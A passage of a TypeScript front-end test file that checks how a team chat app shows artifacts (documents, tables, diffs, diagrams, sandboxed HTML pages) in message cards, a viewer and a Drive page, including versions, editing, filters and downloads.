import { afterAll, afterEach, beforeAll, beforeEach, describe, expect, test } from "bun:test";
import { setupDom } from "@agenteschat/ui/testing/dom";

setupDom();

import type { ApiClient, Artifact } from "@agenteschat/client";
import {
  documentPreview,
  parsePatch,
  patchCounts,
  sideBySide,
  sortRows,
  toCsv,
} from "@agenteschat/client/lib/artifacts";
import {
  artifactPlace,
  daysLeft,
  driveSections,
  groupArtifacts,
  rangeOf,
  sortArtifacts,
} from "@agenteschat/client/lib/drive";
import { PAGE_CSP } from "@agenteschat/client/lib/isolated-page";
import { act, cleanup, fireEvent, render, within } from "@testing-library/react";
import { fileSaver } from "@/components/artifacts/ArtifactViewer";
import { HTML_SANDBOX, HtmlFrame, withShim } from "@/components/artifacts/HtmlFrame";
import { setMermaidRenderer } from "@/components/artifacts/Mermaid";
import { Markdown, parseMarkdown } from "@/lib/markdown";
import { ATLAS_ID, createFakeApi, ENG_ID, ORG_ID, seedState } from "./fake-api";
import { renderApp, screen, settle, showIn } from "./render";

const saved: { url: string; name: string }[] = [];
const copied: string[] = [];
const realSave = fileSaver.save;
beforeAll(() => {
  setMermaidRenderer(
    async (_id, source) => `<svg xmlns="http://www.w3.org/2000/svg"><text>${source.length}</text></svg>`,
  );
  fileSaver.save = (url, name) => {
    saved.push({ url, name });
  };
  Object.defineProperty(navigator, "clipboard", {
    configurable: true,
    value: { writeText: async (v: string) => void copied.push(v) },
  });
});
afterAll(() => {
  setMermaidRenderer(null);
  fileSaver.save = realSave;
});
afterEach(() => {
  cleanup();
  saved.length = 0;
  copied.length = 0;
});

const click = (el: Element) => act(async () => fireEvent.click(el));
/** Opens a dropdown (Radix: keyboard) and picks an item. */
const pick = async (scope: HTMLElement, trigger: string | RegExp, item: string) => {
  const button = within(scope).getByRole("button", { name: trigger });
  button.focus();
  await act(async () => {
    fireEvent.keyDown(button, { key: "Enter" });
    fireEvent.keyUp(button, { key: "Enter" });
  });
  await act(() => new Promise((r) => setTimeout(r, 0)));
  await click(within(screen().getByRole("menu")).getByRole("menuitem", { name: item }));
};
const type = (el: Element, value: string) => act(async () => fireEvent.change(el, { target: { value } }));

/** The seeded mock artifacts, by kind. */
async function byKind(api: ApiClient) {
  const list = await api.artifacts.list(ORG_ID);
  const get = (kind: Artifact["kind"]) => list.find((a) => a.kind === kind) as Artifact;
  return {
    document: get("document"),
    table: get("table"),
    diff: get("diff"),
    diagram: get("diagram"),
    html: get("html"),
  };
}

/** Channel #eng with one agent message carrying every kind of artifact. */
async function openChannel() {
  const state = seedState();
  const api = createFakeApi(state);
  const a = await byKind(api);
  state.messages.push({
    id: "m-art",
    channelId: ENG_ID,
    threadId: null,
    author: { type: "agent", id: ATLAS_ID },
    body: "Deixei os arquivos no Drive.",
    mentionedAgentIds: [],
    agentRunId: "r-art",
    meta: {
      artifacts: [
        { id: a.document.id, version: 2 },
        { id: a.table.id, version: 1 },
        { id: a.diff.id, version: 1 },
        { id: a.diagram.id, version: 1 },
        { id: a.html.id, version: 1 },
      ],
    },
    createdAt: new Date().toISOString(),
  });
  const r = await renderApp(`/org/${ORG_ID}/c/${ENG_ID}`, { api });
  await settle(8);
  return { ...r, api, a };
}

const card = (title: string) => {
  const open = screen().getByRole("button", { name: `Abrir ${title}` });
  return open.closest(".artifact-tile") as HTMLElement;
};
const openCard = async (title: string) => {
  await click(screen().getByRole("button", { name: `Abrir ${title}` }));
  await settle(6);
  return screen().getByRole("dialog", { name: title });
};

describe("artifact cards in the chat", () => {
  test("one tile per kind: what it holds drawn small on top, its name with its kind and size under it", async () => {
    await openChannel();
    const meta = (tile: HTMLElement) => tile.querySelector(".artifact-tile__meta")?.textContent;
    const doc = card("Relatório de incidente: checkout");
    // The document's own start, its headings and lists as in the document; no "made by" (the message says who).
    expect(doc.querySelector(".artifact-tile__cover h2")?.textContent).toBe("Incidente no checkout");
    expect(doc.querySelector(".artifact-tile__cover li")?.textContent).toBe("142 eventos desde ontem");
    expect(doc.querySelector(".artifact-tile__title")?.textContent).toBe("Relatório de incidente: checkout");
    expect(meta(doc)).toBe("Documento · v2");
    expect(doc.textContent).not.toContain("gerado por");

    const table = card("Pedidos mais comuns nos reviews");
    expect(meta(table)).toBe("Tabela · 4 linhas");
    expect(within(table).getAllByRole("row")).toHaveLength(5); // header + its first rows
    expect(table.textContent).toContain("Modo offline");
    // A column of numbers lines up on the right; words stay on the left.
    const [name, mentions] = Array.from(table.querySelectorAll("tbody tr:first-child td"));
    expect([name?.className ?? "", mentions?.className]).toEqual(["", "is-num"]);

    const diff = card("Corrige o checkout com carrinho vazio");
    expect(meta(diff)).toMatch(/^2 arquivos · \+\d+ −\d+$/);
    const first = diff.querySelector(".artifact-tile__files li") as HTMLElement;
    expect(first.querySelector("code")?.textContent).toBe("api/checkout.ts");
    expect(first.textContent).toContain("+4");
    expect(first.textContent).toContain("−1");

    const diagram = card("Organograma do time");
    const img = within(diagram).getByRole("img", { name: "Diagrama: Organograma do time" });
    expect(img.getAttribute("src")?.startsWith("data:image/svg+xml")).toBe(true);

    expect(meta(diagram)).toBe("Diagrama · v1");

    const html = card("Painel de erros da semana");
    expect(meta(html)).toBe("Página HTML · v1");
    // A live thumbnail: the same sandbox, a picture with no scrollbar, out of the tab order and hidden from screen readers.
    await settle(3);
    expect(within(html).getByRole("img", { name: "Página interativa. Abra para ver." })).toBeTruthy();
    const thumb = html.querySelector("iframe") as HTMLIFrameElement;
    expect(thumb.getAttribute("sandbox")).toBe("allow-scripts allow-forms");
    expect(thumb.getAttribute("scrolling")).toBe("no");
    expect(thumb.getAttribute("tabindex")).toBe("-1");
    expect(thumb.getAttribute("aria-hidden")).toBe("true");
  });
});

describe("a tile's actions", () => {
  test("Download and More sit over the cover: Download saves it, More has the right click's other actions", async () => {
    await openChannel();
    const doc = card("Relatório de incidente: checkout");
    const acts = doc.querySelector(".artifact-tile__acts") as HTMLElement;
    await click(within(acts).getByRole("button", { name: "Baixar" }));
    await settle(2);
    expect(saved.at(-1)?.name).toMatch(/\.md$/);
    await pick(acts, "Mais ações: Relatório de incidente: checkout", "Copiar link");
    await settle(2);
    expect(copied.at(-1)).toContain("/drive");
  });
});

describe("a file card's right click (desktop app)", () => {
  test("who may delete it gets Mover para a lixeira, which asks first and sends it to the trash", async () => {
    const w = window as { __agentesDesktop?: unknown; __TAURI_INTERNALS__?: unknown };
    w.__agentesDesktop = { version: "0.6.0" };
    w.__TAURI_INTERNALS__ = { invoke: async (cmd: string) => (cmd === "this_mac" ? { orgs: [] } : {}) };
    try {
      const { api, a } = await openChannel();
      await act(async () =>
        fireEvent.contextMenu(card("Relatório de incidente: checkout"), { clientX: 40, clientY: 60 }),
      );
      await settle(2);
      const menu = screen().getByRole("menu");
      await click(within(menu).getByRole("menuitem", { name: "Mover para a lixeira" }));
      await settle(2);
      const confirm = screen().getByRole("dialog", {
        name: "Mover “Relatório de incidente: checkout” para a lixeira?",
      });
      await click(within(confirm).getByRole("button", { name: "Mover para a lixeira" }));
      await settle(4);
      expect((await api.artifacts.trash(ORG_ID)).map((x) => x.id)).toContain(a.document.id);
    } finally {
      delete w.__agentesDesktop;
      delete w.__TAURI_INTERNALS__;
    }
  });
});

describe("artifact viewer", () => {
  test("document: rendered Markdown with code in mono, download and copy link", async () => {
    const { a } = await openChannel();
    const dialog = await openCard("Relatório de incidente: checkout");
    expect(within(dialog).getByRole("heading", { name: "O que aconteceu" })).toBeTruthy();
    expect(dialog.querySelector("pre.code-card__code code")?.textContent).toContain("if (!cart.items.length)");
    expect(within(dialog).getByText("38 clientes").tagName).toBe("STRONG");
    await pick(dialog, "Baixar", "Original");
    await settle(3);
    expect(saved[0]?.name).toBe("relatorio-de-incidente-checkout.md");
    expect(saved[0]?.url.startsWith("data:text/markdown")).toBe(true);
    await pick(dialog, "Baixar", "PDF");
    expect(saved[1]?.name).toBe("relatorio-de-incidente-checkout.pdf");
    expect(saved[1]?.url).toBe(`/api/app/organizations/${ORG_ID}/artifacts/${a.document.id}/file?version=2&format=pdf`);
    await pick(dialog, "Baixar", "Word (.docx)");
    expect(saved[2]?.name).toBe("relatorio-de-incidente-checkout.docx");
    expect(saved[2]?.url).toBe(
      `/api/app/organizations/${ORG_ID}/artifacts/${a.document.id}/file?version=2&format=docx`,
    );
    await pick(dialog, /^Mais ações: /, "Copiar link");
    await settle(2);
    expect(copied[0]).toBe(`http://localhost:3000/org/${ORG_ID}/drive?artifact=${a.document.id}`);
    expect(screen().getByText("Link copiado.")).toBeTruthy();
    // The whole text in one click, right after Baixar and Compartilhar: the document's Markdown as it was written.
    const copy = within(dialog).getByRole("button", { name: "Copiar texto" });
    expect(copy.previousElementSibling?.textContent).toContain("Compartilhar");
    await click(copy);
    await settle(2);
    expect(copied[1]).toContain("## O que aconteceu");
    expect(copied[1]).toContain("**38 clientes**");
    expect(screen().getByText("Texto copiado.")).toBeTruthy();
  });

  test("an uploaded text file (HTML, JSON, code): Copiar texto between Baixar and Enviar nova versão", async () => {
    const api = createFakeApi(seedState());
    const page = '<h2 id="combo">Como funciona</h2>\n<p>Texto da matéria.</p>\n';
    const html = await api.artifacts.upload(ORG_ID, new File([page], "materia.html", { type: "text/html" }));
    const json = await api.artifacts.upload(
      ORG_ID,
      new File(['{"ok":true}'], "dados.json", { type: "application/json" }),
    );
    const bin = await api.artifacts.upload(ORG_ID, new File([new Uint8Array([1, 2, 3])], "dados.bin"));
    await renderApp(`/org/${ORG_ID}/drive?artifact=${html.id}`, { api });
    await settle(8);
    const dialog = screen().getByRole("dialog", { name: "materia.html" });
    const actions = [...(dialog.querySelector(".ac-details__actions")?.children ?? [])].map((b) => b.textContent);
    expect(actions.slice(0, 4)).toEqual(["Baixar", "Compartilhar", "Copiar texto", "Enviar nova versão"]);
    // On a phone each is its icon alone (its words hidden, still its name): the file's name keeps the room to read.
    expect(
      [...dialog.querySelectorAll(".ac-details__actions .artifact-action__label")].map((l) => l.textContent),
    ).toEqual(["Baixar", "Compartilhar", "Copiar texto", "Enviar nova versão"]);
    expect(within(dialog).getByRole("button", { name: "Enviar nova versão" }).getAttribute("title")).toBe(
      "Enviar nova versão",
    );
    await click(within(dialog).getByRole("button", { name: "Copiar texto" }));
    await settle(2);
    expect(copied.at(-1)).toBe(page);
    cleanup();
    await renderApp(`/org/${ORG_ID}/drive?artifact=${json.id}`, { api });
    await settle(8);
    await click(
      within(screen().getByRole("dialog", { name: "dados.json" })).getByRole("button", { name: "Copiar texto" }),
    );
    await settle(2);
    expect(copied.at(-1)).toBe('{"ok":true}');
    cleanup();
    // A file with no text to show has none to copy.
    await renderApp(`/org/${ORG_ID}/drive?artifact=${bin.id}`, { api });
    await settle(8);
    expect(
      within(screen().getByRole("dialog", { name: "dados.bin" })).queryByRole("button", { name: "Copiar texto" }),
    ).toBeNull();
  });

  test("table: sticky header, sort and Baixar CSV", async () => {
    const { a } = await openChannel();
    const dialog = await openCard("Pedidos mais comuns nos reviews");
    // A table has no one text to copy.
    expect(within(dialog).queryByRole("button", { name: "Copiar texto" })).toBeNull();
    const firstColumn = () =>
      within(dialog)
        .getAllByRole("row")
        .slice(1)
        .map((r) => r.querySelector("td")?.textContent);
    expect(firstColumn()).toEqual(["Modo offline", "Exportar em PDF", "Tema escuro", "Login com Google"]);
    await click(within(dialog).getByRole("button", { name: "Ordenar por Menções" }));
    expect(firstColumn()).toEqual(["Login com Google", "Tema escuro", "Exportar em PDF", "Modo offline"]);
    expect(
      within(dialog)
        .getByRole("columnheader", { name: /Menções/ })
        .getAttribute("aria-sort"),
    ).toBe("ascending");
    await click(within(dialog).getByRole("button", { name: "Ordenar por Menções" }));
    expect(firstColumn()[0]).toBe("Modo offline");
    await click(within(dialog).getByRole("button", { name: "Ordenar por Pedido" }));
    expect(firstColumn()[0]).toBe("Exportar em PDF");
    await pick(dialog, "Baixar", "Planilha (.csv)");
    expect(saved[0]?.name).toBe("pedidos-mais-comuns-nos-reviews.csv");
    // The server converts (`GET …/artifacts/{id}/file?format=csv`).
    expect(saved[0]?.url).toBe(`/api/app/organizations/${ORG_ID}/artifacts/${a.table.id}/file?version=1&format=csv`);
  });

  test("diff: unified and side by side, per file, neutral style", async () => {
    await openChannel();
    const dialog = await openCard("Corrige o checkout com carrinho vazio");
    const file = within(dialog).getByRole("region", { name: "Alterações em api/checkout.ts" });
    expect(within(dialog).getByRole("region", { name: "Alterações em api/checkout.test.ts" })).toBeTruthy();
    expect(file.querySelector('[data-mode="unified"]')).not.toBeNull();
    expect(file.querySelectorAll(".ac-diff__line--add")).toHaveLength(4);
    expect(file.querySelectorAll(".ac-diff__line--del")).toHaveLength(1);
    expect(file.textContent).toContain("Adicionado: ");
    // No green or red: only the neutral diff classes.
    expect(dialog.innerHTML).not.toMatch(/\b(green|red)\b|#0f0|#f00/i);
    await click(within(dialog).getByRole("radio", { name: "Lado a lado" }));
    expect(within(dialog).getByRole("radio", { name: "Lado a lado" }).getAttribute("aria-checked")).toBe("true");
    const split = file.querySelector('[data-mode="split"]') as HTMLElement;
    const changed = Array.from(split.querySelectorAll(".artifact-split__row")).find((r) =>
      r.textContent?.includes("const total"),
    );
    // The removed line sits next to the first added line.
    expect(changed?.children[0]?.className).toContain("ac-diff__line--del");
    expect(changed?.children[1]?.className).toContain("ac-diff__line--add");
  });

  test("diagram: drawn as an image, in the same card as a Markdown fence", async () => {
    await openChannel();
    const dialog = await openCard("Organograma do time");
    await settle(3);
    // The viewer now uses the ```mermaid fence card, so the drawing sits in its preview (and waits for a press where the
    // frame shares the page's thread). The fake renderer here runs apart, so it's drawn.
    const img = dialog.querySelector(".code-card__preview img") as HTMLImageElement | null;
    expect(img?.getAttribute("src")?.startsWith("data:image/svg+xml")).toBe(true);
  });

  test("html: only in a sandboxed iframe, with scripts and forms and never allow-same-origin", async () => {
    await openChannel();
    const dialog = await openCard("Painel de erros da semana");
    await settle(3);
    const frame = dialog.querySelector("iframe") as HTMLIFrameElement;
    expect(frame).not.toBeNull();
    expect(frame.getAttribute("sandbox")).toBe("allow-scripts allow-forms");
    expect(HTML_SANDBOX).toBe("allow-scripts allow-forms");
    expect(frame.getAttribute("sandbox")).not.toContain("allow-same-origin");
    expect(frame.hasAttribute("srcdoc")).toBe(false);
    expect(frame.getAttribute("src")).toMatch(/^(blob:|data:text\/html)/);
    expect(frame.hasAttribute("loading")).toBe(false);
    expect(frame.hasAttribute("scrolling")).toBe(false);
    expect(frame.getAttribute("title")).toBe("Página: Painel de erros da semana");
    // The page is never inlined into our DOM.
    expect(document.body.innerHTML).not.toContain("Erros da semana</h1>");
    expect(document.querySelectorAll("script").length).toBe(0);
  });
});

describe("versions and editing", () => {
  test("switch versions, see who changed what and the note", async () => {
    await openChannel();
    const dialog = await openCard("Relatório de incidente: checkout");
    const history = within(dialog).getByRole("navigation", { name: "Versões" });
    const items = within(history).getAllByRole("button");
    expect(items).toHaveLength(2);
    expect(items[0]?.textContent).toContain("v2");
    expect(items[0]?.textContent).toContain("Atual");
    expect(items[0]?.textContent).toContain("Acrescentei quem foi afetado.");
    expect(items[0]?.getAttribute("aria-current")).toBe("true");
    expect(items[1]?.textContent).toContain("Sem nota");
    expect(dialog.textContent).toContain("38 clientes");

    await click(items[1] as HTMLElement);
    await settle(4);
    const again = screen().getByRole("dialog", { name: "Relatório de incidente: checkout" });
    expect(again.textContent).toContain("Vendo a v1. A mais recente é a v2.");
    expect(again.textContent).not.toContain("38 clientes");
    // Old versions are read-only.
    expect(within(again).queryByRole("button", { name: "Editar" })).toBeNull();
    await click(within(again).getByRole("button", { name: "Ver a mais recente" }));
    await settle(4);
    expect(screen().getByRole("dialog").textContent).toContain("38 clientes");
  });

  test("editing a document saves a new version with a note", async () => {
    const { api, a } = await openChannel();
    const dialog = await openCard("Relatório de incidente: checkout");
    await click(within(dialog).getByRole("button", { name: "Editar" }));
    expect(dialog.textContent).toContain("Editando: salvar cria a v3.");
    await type(within(dialog).getByLabelText("Texto em Markdown"), "# Incidente\n\nResolvido às 19h.");
    await type(within(dialog).getByLabelText("Nota da alteração (opcional)"), "Fechei o incidente.");
    await click(within(dialog).getByRole("button", { name: "Salvar nova versão" }));
    await settle(6);
    expect(screen().getByText("Versão 3 salva.")).toBeTruthy();
    const view = screen().getByRole("dialog");
    expect(view.textContent).toContain("Resolvido às 19h.");
    const history = within(view).getByRole("navigation", { name: "Versões" });
    expect(within(history).getAllByRole("button")[0]?.textContent).toContain("Fechei o incidente.");
    expect((await api.artifacts.versions(ORG_ID, a.document.id)).map((v) => v.version)).toEqual([3, 2, 1]);
  });

  test("a stale edit (someone saved first) is explained, not lost silently", async () => {
    const { api, a } = await openChannel();
    const dialog = await openCard("Relatório de incidente: checkout");
    await click(within(dialog).getByRole("button", { name: "Editar" }));
    await api.artifacts.update(ORG_ID, a.document.id, {
      content: { kind: "document", markdown: "outra" },
      baseVersion: 2,
    });
    await type(within(dialog).getByLabelText("Texto em Markdown"), "minha versão");
    await click(within(dialog).getByRole("button", { name: "Salvar nova versão" }));
    await settle(4);
    expect(dialog.textContent).toContain("Alguém salvou uma versão nova enquanto você editava.");
  });

  test("editing a table: change a cell, add a row", async () => {
    const { api, a } = await openChannel();
    const dialog = await openCard("Pedidos mais comuns nos reviews");
    await click(within(dialog).getByRole("button", { name: "Editar" }));
    await type(within(dialog).getByLabelText("Menções, linha 1"), "33");
    await click(within(dialog).getByRole("button", { name: "Adicionar linha" }));
    await type(within(dialog).getByLabelText("Pedido, linha 5"), "Widget");
    await click(within(dialog).getByRole("button", { name: "Remover linha 4" }));
    await click(within(dialog).getByRole("button", { name: "Salvar nova versão" }));
    await settle(6);
    const latest = await api.artifacts.get(ORG_ID, a.table.id);
    expect(latest.version).toBe(2);
    expect(latest.content).toMatchObject({
      kind: "table",
      rows: [
        ["Modo offline", "33", "2,6"],
        ["Exportar em PDF", "18", "3,1"],
        ["Tema escuro", "12", "4,0"],
        ["Widget", "", ""],
      ],
    });
  });

  test("agents' diffs, diagrams and pages can't be edited in place", async () => {
    await openChannel();
    const dialog = await openCard("Corrige o checkout com carrinho vazio");
    expect(within(dialog).queryByRole("button", { name: "Editar" })).toBeNull();
  });

  test("artifact.updated refreshes what is open", async () => {
    const r = await openChannel();
    const socket = r.sockets.last();
    await act(async () => socket.open());
    await settle(2);
    const dialog = await openCard("Pedidos mais comuns nos reviews");
    expect(within(within(dialog).getByRole("navigation", { name: "Versões" })).getAllByRole("button")).toHaveLength(1);
    const updated = await r.api.artifacts.update(ORG_ID, r.a.table.id, {
      content: { kind: "table", columns: ["Pedido"], rows: [["Novo"]] },
      note: "Refiz",
      baseVersion: 1,
    });
    await act(async () =>
      socket.push({
        type: "event",
        channelId: ENG_ID,
        event: { type: "artifact.updated", channelId: ENG_ID, artifact: updated },
      }),
    );
    await settle(6);
    const history = within(screen().getByRole("dialog")).getByRole("navigation", { name: "Versões" });
    expect(within(history).getAllByRole("button")).toHaveLength(2);
    expect(screen().getByRole("dialog").textContent).toContain("Novo");
  });
});

describe("Drive", () => {
  const goDrive = async (options: { seed?: boolean; path?: string; api?: ApiClient } = {}) => {
    const state = seedState();
    const api = options.api ?? createFakeApi(state, { seed: options.seed ?? true });
    const r = await renderApp(`/org/${ORG_ID}/drive${options.path ?? ""}`, { api });
    await settle(8);
    return { ...r, api, state };
  };
  /** The items' titles, in the order shown (cards or rows). */
  const names = () => Array.from(document.querySelectorAll(".drive-hit")).map((b) => b.textContent);
  const card = (title: string) => screen().getByRole("button", { name: title });
  const keyDown = (key: string, init: Record<string, unknown> = {}) =>
    act(async () => fireEvent.keyDown(document.body, { key, ...init }));
  /** Opens a dropdown (Radix: keyboard) and picks one of its radio items. */
  const pickRadio = async (trigger: RegExp, item: string) => {
    const button = screen().getByRole("button", { name: trigger });
    button.focus();
    await act(async () => {
      fireEvent.keyDown(button, { key: "Enter" });
      fireEvent.keyUp(button, { key: "Enter" });
    });
    await act(() => new Promise((r) => setTimeout(r, 0)));
    await click(within(screen().getByRole("menu")).getByRole("menuitemradio", { name: item }));
    await settle(2);
  };
  beforeEach(() => localStorage.removeItem("agentes.drive.view"));

  /** Tipo, one filter of the bar (FilterChip): its trigger. */
  const kindTrigger = () =>
    screen()
      .getAllByRole("button")
      .find((b) => b.classList.contains("ac-filter__trigger") && /Tipo|tipos/.test(b.textContent ?? "")) as HTMLElement;
  const pressEscape = () =>
    act(async () => fireEvent.keyDown(document.activeElement ?? document.body, { key: "Escape" }));

  test("lists everything, newest update first; search and Tipo narrow it", async () => {
    await goDrive();
    expect(screen().getByRole("heading", { level: 1, name: "Drive" })).toBeTruthy();
    // Grid by default, grouped by date.
    expect(document.querySelector(".drive-grid")).not.toBeNull();
    expect(names()).toEqual([
      "Painel de erros da semana",
      "Organograma do time",
      "Corrige o checkout com carrinho vazio",
      "Pedidos mais comuns nos reviews",
      "Relatório de incidente: checkout",
    ]);
    await type(screen().getByRole("searchbox", { name: "Buscar arquivos" }), "pedidos");
    await settle(4);
    expect(names()).toEqual(["Pedidos mais comuns nos reviews"]);
    expect(screen().getByText("1 item")).toBeTruthy();
    await type(screen().getByRole("searchbox", { name: "Buscar arquivos" }), "");
    await settle(4);

    // Tipo: one filter of the bar, never a row of its own; each kind with its icon and how many there are.
    expect(screen().queryByRole("group", { name: "Tipos" })).toBeNull();
    await click(kindTrigger());
    const kinds = screen().getByRole("listbox", { name: "Tipo" });
    const diffs = within(kinds).getByRole("option", { name: /^Alterações de código/ });
    expect(diffs.querySelector("svg")).not.toBeNull();
    expect(diffs.querySelector(".ac-countchip")?.textContent).toBe("1");
    await click(diffs);
    await settle(4);
    expect(diffs.getAttribute("aria-selected")).toBe("true");
    expect(names()).toEqual(["Corrige o checkout com carrinho vazio"]);
    // Two kinds: either of them.
    await click(within(kinds).getByRole("option", { name: /^Diagramas/ }));
    await pressEscape();
    await settle(4);
    expect(names()).toEqual(["Organograma do time", "Corrige o checkout com carrinho vazio"]);
    expect(kindTrigger().textContent).toContain("2 tipos");

    // Nothing matches → explained, with a way out that also clears the search.
    await type(screen().getByRole("searchbox", { name: "Buscar arquivos" }), "nada disso");
    await settle(4);
    expect(screen().getByText("Nenhum arquivo com esses filtros.")).toBeTruthy();
    // The bar's own "Limpar filtros" shows too, with Tipo active: the empty state's clears the search as well.
    const empty = screen().getByText("Nenhum arquivo com esses filtros.").closest(".ac-empty") as HTMLElement;
    await click(within(empty).getByRole("button", { name: "Limpar filtros" }));
    await settle(4);
    expect(names()).toHaveLength(5);
  });

  test("past 100 files: Carregar mais brings the next ones, and Tipo counts every file", async () => {
    const api = createFakeApi(seedState(), { seed: true });
    for (let i = 1; i <= 100; i++)
      await api.artifacts.create(ORG_ID, { title: `Nota ${i}`, content: { kind: "document", markdown: "x" } });
    const documents = (await api.artifacts.page(ORG_ID)).counts?.document ?? 0;
    expect(documents).toBeGreaterThan(100);
    await goDrive({ api });
    expect(names()).toHaveLength(100);
    await click(kindTrigger());
    const kinds = screen().getByRole("listbox", { name: "Tipo" });
    const docs = within(kinds).getByRole("option", { name: /^Documentos/ });
    expect(docs.querySelector(".ac-countchip")?.textContent).toBe(String(documents));
    await pressEscape();
    await click(screen().getByRole("button", { name: "Carregar mais" }));
    await settle(6);
    expect(names()).toHaveLength(105);
    expect(screen().queryByRole("button", { name: "Carregar mais" })).toBeNull();
  });

  test("who made it: agents or people", async () => {
    await goDrive();
    await click(screen().getByRole("radio", { name: "Pessoas" }));
    await settle(4);
    expect(names()).toEqual([]);
    expect(screen().getByText("Nenhum arquivo com esses filtros.")).toBeTruthy();
    await click(screen().getByRole("radio", { name: "Agentes" }));
    await settle(4);
    expect(names()).toHaveLength(5);
  });

  test("filter by person or agent and by channel", async () => {
    const { api } = await goDrive();
    const list = await api.artifacts.list(ORG_ID);
    const doc = list.find((a) => a.kind === "document") as Artifact;
    await click(screen().getByRole("button", { name: "Pessoa ou agente" }));
    const listbox = screen().getByRole("listbox", { name: "Pessoa ou agente" });
    expect(listbox.getAttribute("aria-multiselectable")).toBe("true");
    expect(listbox.querySelector(".ac-avatar--agent")).not.toBeNull();
    expect(listbox.textContent).toContain("Agentes");
    expect(listbox.textContent).toContain("Pessoas");
    // The person who edited the report (v2) finds it.
    const me = (await api.account.me())?.user.name ?? "";
    await click(within(listbox).getByRole("option", { name: me }));
    await act(async () => fireEvent.keyDown(document.activeElement ?? document.body, { key: "Escape" }));
    await settle(4);
    expect(names()).toEqual([doc.title]);

    const channels = await api.chat.channels(ORG_ID);
    const home = channels.find((c) => c.id === doc.channelId);
    const elsewhere = channels.find((c) => c.id !== doc.channelId);
    const pickChannel = async (name: string) => {
      const trigger = screen()
        .getAllByRole("button")
        .find((b) => b.classList.contains("ac-filter__trigger") && /Canal|#|canais/.test(b.textContent ?? ""));
      await click(trigger as HTMLElement);
      await click(within(screen().getByRole("listbox", { name: "Canal" })).getByRole("option", { name: `#${name}` }));
      await act(async () => fireEvent.keyDown(document.activeElement ?? document.body, { key: "Escape" }));
      await settle(4);
    };
    await pickChannel(elsewhere?.name ?? "");
    expect(screen().getByText("Nenhum arquivo com esses filtros.")).toBeTruthy();
    expect(screen().getByRole("button", { name: `#${elsewhere?.name}` })).toBeTruthy();
    // Several channels: any of them, and the chip counts them.
    await pickChannel(home?.name ?? "");
    expect(names()).toEqual([doc.title]);
    expect(screen().getByRole("button", { name: "2 canais" })).toBeTruthy();
  });

  // The worst case for CI's geometry check (the capture keeps each of these screens): German words, a long channel,
  // every filter in use and Typ open, then Japanese. One toolbar, on two rows only where one can't hold it.
  test("German and Japanese with every filter in use: still one toolbar, Typ among its filters", async () => {
    const state = seedState();
    const eng = state.channels.find((c) => c.id === ENG_ID);
    if (eng) eng.name = "produkteinfuehrung-herbstkampagne-2026";
    const { services, api } = await goDrive({ api: createFakeApi(state, { seed: true }) });
    await showIn(services, "de");
    const trigger = (name: RegExp) =>
      screen()
        .getAllByRole("button")
        .find((b) => b.classList.contains("ac-filter__trigger") && name.test(b.textContent ?? "")) as HTMLElement;
    // Typ first, while every kind is there to pick.
    await click(trigger(/^Typ/));
    const kinds = screen().getByRole("listbox", { name: "Typ" });
    for (const kind of [/^Dokumente/, /^Codeänderungen/])
      await click(within(kinds).getByRole("option", { name: kind }));
    await pressEscape();
    await settle(4);
    await click(trigger(/Kanal/));
    await click(
      within(screen().getByRole("listbox", { name: "Kanal" })).getByRole("option", {
        name: "#produkteinfuehrung-herbstkampagne-2026",
      }),
    );
    await pressEscape();
    await settle(4);
    const me = (await api.account.me())?.user.name ?? "";
    await click(trigger(/Person oder Agent/));
    await click(within(screen().getByRole("listbox", { name: "Person oder Agent" })).getByRole("option", { name: me }));
    await pressEscape();
    await settle(4);
    expect(trigger(/Typen/).textContent).toContain("2 Typen");
    expect(document.querySelectorAll(".drive .ac-toolbar")).toHaveLength(1);
    await showIn(services, "ja");
    expect(screen().getByRole("searchbox", { name: "ファイルを検索" })).toBeTruthy();
  });

  test("empty state when there is nothing yet", async () => {
    await goDrive({ seed: false });
    expect(screen().getByText("Tudo o que o time cria, num só lugar")).toBeTruthy();
    expect(document.querySelector(".ac-empty__text")?.textContent).toBe(
      "Os arquivos de agentes e pessoas ficam aqui. Envie os seus ou arraste para esta página.",
    );
    // One way to upload, in the middle of the page.
    expect(screen().getAllByRole("button", { name: "Enviar arquivo" })).toHaveLength(1);
    expect(document.querySelector(".ac-pagehead__meta")?.textContent).toBe(
      "Tudo o que pessoas e agentes criaram ou enviaram.",
    );
  });

  test("grid or list, remembered", async () => {
    await goDrive();
    const view = screen().getByRole("radiogroup", { name: "Visualização" });
    expect(within(view).getByRole("radio", { name: "Grade" }).getAttribute("aria-checked")).toBe("true");
    await click(within(view).getByRole("radio", { name: "Lista" }));
    await settle(2);
    expect(document.querySelector(".drive-grid")).toBeNull();
    expect(document.querySelectorAll(".drive-list .drive-row")).toHaveLength(5);
    expect(localStorage.getItem("agentes.drive.view")).toBe("list");
    // Rows keep the same actions: the "…" menu per file.
    expect(screen().getByRole("button", { name: "Mais ações: Organograma do time" })).toBeTruthy();
    cleanup();

    await goDrive();
    expect(document.querySelector(".drive-grid")).toBeNull();
    expect(names()).toHaveLength(5);
  });

  test("group by channel or none, sort by name", async () => {
    await goDrive();
    await pickRadio(/^Organizar:/, "Sem grupos");
    expect(document.querySelectorAll(".drive-group__head")).toHaveLength(0);
    await pickRadio(/^Organizar:/, "Nome");
    expect(names()).toEqual([
      "Corrige o checkout com carrinho vazio",
      "Organograma do time",
      "Painel de erros da semana",
      "Pedidos mais comuns nos reviews",
      "Relatório de incidente: checkout",
    ]);
    await pickRadio(/^Organizar:/, "Canal");
    expect(document.querySelector(".drive-group__head .ac-grouphead__title")?.textContent).toMatch(/^#/);
  });

  test("a click shows the details: preview, Abrir, Baixar, Copiar link, versions, where", async () => {
    await goDrive();
    // The card says it opens a dialog (checked before: the open modal hides the page behind it).
    expect(card("Organograma do time").getAttribute("aria-haspopup")).toBe("dialog");
    await click(card("Organograma do time"));
    await settle(4);
    const panel = screen().getByRole("dialog", { name: "Organograma do time" });
    expect(within(panel).getByRole("heading", { level: 2, name: "Organograma do time" })).toBeTruthy();
    expect(panel.querySelector(".drive-pv--lg")).not.toBeNull();
    expect(panel.textContent).toContain("Feito por");
    expect(panel.textContent).toContain("Onde aparece");

    // Baixar: diagrams have one format (the original).
    await click(within(panel).getByRole("button", { name: "Baixar" }));
    await settle(2);
    expect(saved[0]?.name).toBe("organograma-do-time.mmd");
    await click(within(panel).getByRole("button", { name: "Copiar link" }));
    await settle(2);
    expect(copied[0]).toContain("/drive?artifact=");
    expect(within(panel).getByRole("button", { name: "Mais ações: Organograma do time" })).toBeTruthy();

    // Esc closes it.
    await keyDown("Escape");
    await settle(2);
